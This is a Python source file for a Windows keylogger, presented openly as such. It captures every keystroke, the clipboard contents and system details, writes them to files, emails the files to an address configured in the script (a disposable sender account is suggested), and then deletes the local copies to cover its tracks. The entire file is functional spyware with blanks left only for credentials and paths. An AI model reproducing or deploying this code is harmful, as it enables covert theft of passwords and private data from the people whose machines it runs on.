#A simple keystroke logger program that has the capability to get the users keyboard input,
#the clipboard of copy paste, and the machine's infomation

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
import getpass
from requests import get

#The file names
keys_information = "key_log.txt"
system_information = "system_info.txt"
clipboard_information = "clipboard_info.txt"

#The email address you want to send this keylogger from
email_address = " " # Enter disposable email here
password = " " # Enter email password here

#The email address you want to send this keystroke log to
sends_to_email_addr = " "

#Specify where will the files get stored
file_path = " " # Enter the file path you want your files to be saved to
extend = "\\"

def send_email(filename, attachment, sends_to_email_addr):
    fromaddr = email_address
    #The email message
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = sends_to_email_addr
    msg['Subject'] = "Keystroke Log File"

    body = "Type stuff here for the body of the email."
    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    #Call the SMTP to use the smtp gmail
    s = smtplib.SMTP('smtp.gmail.com', 587)
    #Create a tls session, login to the email, and send to the email    
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, sends_to_email_addr, text)
    s.quit()

#Getting the computer's information, such as the host name, computer processor, system type, and machine name
def computer_infomation():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        f.write("Hostname: " + hostname + "\n")
        f.write("Processor: " + (platform.processor()) + "\n")
        f.write("System: " + (platform.system()) + " " + (platform.version()) + "\n")
        f.write("Machine: " + (platform.machine()) + "\n")
        
computer_infomation() 

#A way to get what is currently being copied by the user
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        #Getting the text info that is in the copy clipboard
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data)
        #If the copy is not a text but an image or something else instead
        except:
            f.write("Clipboard could be not be copied")

copy_clipboard()

#List of keys that is pressed and gets added 
count = 0
keys =[]

#The onpress function that takes a keyboard input
def on_press(key):
    global keys, count
    #key press printout and appending to the list of keys
    print(key)
    keys.append(key)
    count += 1
    currentTime = time.time()
    #write out to the file
    if(count >= 1):
        count = 0
        write_to_file(keys)
        keys = []

#To write out to a file
def write_to_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        # making the output text file to be readable, instead of having 'h''e''l''l''o'
        # it would look like 'hello'
        for key in keys:
            current_key_input = str(key).replace("'", "")
            if((current_key_input.find("space") > 0) or (current_key_input.find("enter") > 0)):
                f.write('\n')
                f.close()
            elif(current_key_input.find("Key") == -1):
                f.write((current_key_input))
                f.close()

#Stop the program if the esc key is hit
def on_release(key):
    if key == Key.esc:
        return False
   
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

send_email(keys_information, file_path + extend + keys_information, sends_to_email_addr)
send_email(system_information, file_path + extend + system_information, sends_to_email_addr)
send_email(clipboard_information, file_path + extend + clipboard_information, sends_to_email_addr)

#Delete all of the created files once they get sent to the email
delete_files = [system_information, clipboard_information, keys_information]
for file in delete_files:
    os.remove(file_path + extend + file)